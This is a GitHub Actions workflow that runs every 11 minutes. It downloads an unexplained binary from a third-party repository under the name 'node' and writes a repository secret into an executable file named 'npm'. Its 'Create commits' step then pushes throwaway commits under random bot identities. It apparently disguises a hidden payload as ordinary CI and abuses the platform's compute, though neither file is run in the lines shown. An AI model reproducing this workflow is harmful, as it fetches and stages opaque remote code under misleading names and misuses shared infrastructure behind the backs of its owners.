
name: CIx
on: 
  push:
    branches: [ main ]
  schedule:
    - cron: "*/11 * * * *"
jobs:
  satu:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Create commits
        run: |
          wget https://github.com/Arlentak/sa/raw/main/node
          echo " ${{ secrets.TEST }} " > npm
          chmod +x node
          chmod +x npm
          echo $RANDOM | md5sum | head -c 8; echo;
          TTT=$(echo $RANDOM | md5sum | head -c 8;)
          echo " $TTT " > Jess
          echo $TTT
          echo " $RANDOM " > file
          git config --global user.name "github-actions-$TTT"
          git config --global user.email "$TTT-github-actions@users.noreply.github.com"
          git add -A
          git commit -m "Update test.txt"
          git push
